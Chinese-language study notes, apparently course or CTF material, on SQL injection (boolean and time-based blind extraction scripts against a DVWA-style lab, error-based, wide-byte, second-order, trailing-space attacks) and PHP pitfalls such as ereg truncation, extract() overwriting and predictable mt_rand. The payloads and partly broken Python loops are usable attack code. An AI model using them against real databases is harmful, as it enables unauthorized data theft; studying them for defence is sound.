### 盲注思路

盲注入是一类无法从显示页面上获取执行结果，甚至连注 入语句是否执行都无从得知的SQL注入。盲注入的难度比一般注入 高，并且注入流程更加复杂，但也可能够完成攻击

盲注入的核心原理：盲注入（Blind SQL Injection）的本质是攻击者通过构造特殊输入，间接推断数据库响应。由于页面无直接回显，攻击者需依赖时间性盲注和布尔型盲注

#### 布尔盲注：

通过页面是否正常显示（如登录成功/失败）推断条件真假

```
mysql> select first_name from users where user_id = 1^(substr((select database()),1,1)='d')^1;
+------------+
| first_name |
+------------+
| admin      |
+------------+
当中间substr（）里面的语句为真时，才返回1，输出id为1的数据，通常这种方式可以在注释符号不能用的时候来使用，用来闭合后面的引号
在实际渗透中，WAF或代码逻辑经常会过滤或拦截注释符（--、#、/* */）。此时，攻击者无法用注释忽略掉末尾多余的引号，就只能用这种 值1 ^ 条件 ^ 值2 的数学结构，把末尾残留的引号变成合法字符串的一部分（'1'），从而让查询正常执行。

假设原始后端的 SQL 语句是字符串类型的：
SELECT first_name FROM users WHERE user_id = '$id';
如果攻击者注入：
1' ^ (substr((select database()),1,1)='d') ^ '1
拼接后变成：
SELECT first_name FROM users WHERE user_id = '1' ^ (条件) ^ '1';
前后两个字符串1会转换成数字一，只有当括号里面的条件为真时，才返回1，其余返回0，这个就有效避免了当注释符被禁用，不能闭合语句的情况
```

二分查找法：

```
for i in range(1, 10): // 最多执行 9 次，每一轮负责爆破1个字符
    min_value = 32
    max_value = 128
    mid = (min_value + max_value) // 取中值
    
    while min_value < max_value:
        payload = f"?id=1'+and+ascii(substr(database(),{i},1))>{mid}%23&Submit=Submit#" // 通过ascii码去进行比较
        url = SQLI_BLIND_URL + payload
        html = session.get(url=url) // 会自动维持 cookie，多次请求保持同一个会话
        
        if "User ID exists in the database" in html.text:
            # 条件成立：字符ascii > mid → 上调下界
            min_value = mid + 1
        else:
            # 条件不成立：ascii ≤ mid → 下调上界
            max_value = mid
        
        mid = (min_value + max_value) // 中值

    # 只有min_value = max_value时循环结束
    if chr(mid) == " ":
        break
    result += chr(mid)
    print(f"当前结果：{result}")

print("final database name:", result)

```

暴力枚举:

```
result = ""
for i in range(1, 10):
for j in range(33,128):
payload = f"?id=1'+and+sleep(5*(ascii(substr(database(),{i},1))={j}))%23&Submit=Submit#"
url = SQLI_BLIND_URL + payload
try: // try 里面代码运行出错误，就不去继续执行 try 剩余代码，直接跳去except里面执行。
r=session.get(url = url,timeout=4) // 如果服务器在 4 秒以内返回数据 → 请求正常完成,如果没有跳转到except
except: // 如果跳转到except说明注入成功，因为设置的是5秒的等待
result += chr(j)
print("[+]", result)
break
if j == 127:
print("[*] 注入完成")
```

### 报错注入

报错注入本质上是一种带回显的注入方式，但与传统的回显注入不同，它通过数据库的错误信息“外带”出数据。在MySQL中，常用的报错注入函数包括 extractvalue() 和 updatexml() 等。这些函数原本用于处理XML文件，尽管它们的参数数量和具体用途各有差异，但它们都具有一个共同特征：存在一个路径参数。

路径参数的作用是指定XML文件的具体路径。然而，如果在这个路径参数中插入恶意的SQL注入语句，MySQL会优先执行该注入语句，并将执行结果作为XML路径进行解析。由于注入语句的执行结果通常不是一个合法的XML路径，因此会导致解析失败并触发错误。此时，MySQL会返回一条以“XPATH syntaxerror”开头的错误信息，攻击者可以通过分析这条错误信息提取出敏感数据。

总结来说，报错注入的核心原理是利用特定函数的路径参数，将恶意SQL语句嵌入其中，通过数据库的错误反馈来获取数据。

### 宽字节注入

产生宽字节注入的主要原因是字符编码的差异。在注入攻击中，攻击者会使用'和"等特殊字符，而在安全开发过程中，开发者通常会对这些字符进行转义，以防止SQL注入漏洞的产生。在PHP中，最常用的转义函数是addslashes()。mysqli_real_escape_string。

addslashes()函数会在预定义字符之前添加反斜杠（\）。预定义字符包括：单引号（'）、双引号（"）、反斜杠（\）和NULL。

然而，当数据库采用GBK编码（支持宽字节）时，攻击者可以利用MySQL的特性，在使用GBK编码的情况下将\进行转义，从而绕过防护机制，产生SQL注入漏洞。

```
反斜杠(\): %5c
单引号(') : %27
汉字(運) : %df%5c
当我们输入 admin' 时，会自动在单引号前面加反斜杠 admin\'
url编码会变成 admin%5c%27
但是我们输入 admin%df' 时，也会在单引号前面加反斜杠 admin%df\'
url编码会变成 admin%df%5c%27, %df%5c 会被识别成 汉字(運) ，让单引号没有被转义,变成 admin運'
```

### 二次注入

二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。

```
当你要修改用户 admin'# 密码时
update users set password='666' where username='admin'#' and password='123'
你就直接把 admin 用户的密码给修改了
```

### 约束攻击

mysql5.7版本一下

数据库字符串比较：在数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，由于String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。看如下两条查询语句：

```
select * from users where first_name='admin';

+---------+------------+-----------+-------+----------------------------------+--------------------------------+---------------------+--------------+
| 1       | admin      | admin     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | /dvwa/hackable/users/admin.jpg | 2025-04-22 12:36:04 | 0            |
+---------+------------+-----------+-------+----------------------------------+--------------------------------+---------------------+--------------+

select * from users where first_name='admin 	 ';
+---------+------------+-----------+-------+----------------------------------+--------------------------------+---------------------+--------------+
| user_id | first_name | last_name | user  | password                         | avatar                         | last_login          | failed_login |
+---------+------------+-----------+-------+----------------------------------+--------------------------------+---------------------+--------------+
| 1       | admin      | admin     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | /dvwa/hackable/users/admin.jpg | 2025-04-22 12:36:04 | 0            |
```

#### ereg()函数

`ereg()`函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。可选的输入参数规则包含一个数组的所有匹配表达式。ereg()函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配.ereg()函数只能处理字符串的，遇到数组做参数返回NULL。在php5.3及以上已经舍弃这个函数。

例题：

```php

if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
echo '必须输入数字才行';
else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)
die('Flag: '.$flag);
else
echo '骚年，继续努力吧啊~';
}
?>
```

我们需要跳过这个if，可以利用`%00`截断，让`nctf=222%00`

进入`else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)`分支

`strpos($haystack, $needle)`:

作用：在字符串 `$haystack` 里面查找子串 `$needle` 第一次出现的位置。

#### extract()函数

extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。



EXTR_OVERWRITE（默认）：有同名变量，直接覆盖原有变量

```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";
?>
```

原来的 $a="Original" 直接被 extract 覆盖掉。

![image-20260826192701750](/assets/images/21/image-20260826192701750.png)

EXTR_PREFIX_SAME ：当变量已经存在时，新生成变量名加上指定前缀；变量不存在则正常创建，不加前缀。

```php
<?php
$a = "Original";
$my_array = array("a" => "Cat", "b" => "Dog", "c" => "Horse");
extract($my_array, EXTR_PREFIX_SAME, "dup");
echo "\$a = $a; \$b = \$b; \$c = $c; \$dup_a = $dup_a";
?>
```

#### php伪随机数

涉及到两个函数，`mt_srand()`和`mt_rand()`，mt是Mersenne Twister，即梅森旋转算法。s是seed，`mt_srand()`的作用是确定种子，如果`mt_srand(0)`，那么种子就是0，可以直接跟`mt_rand()`，`mt_rand()`是根据种子运算随机数并返回生成的随机数。

相同的种子下，后面生成的每个随机数都是一样的，不论在哪个环境下，但是在php不同版本下随机数就不相同了。

```php
<?PHP
mt_srand(0);
echo mt_rand();
echo "\n";
echo mt_rand();
echo "\n";
echo mt_rand();
?>
```
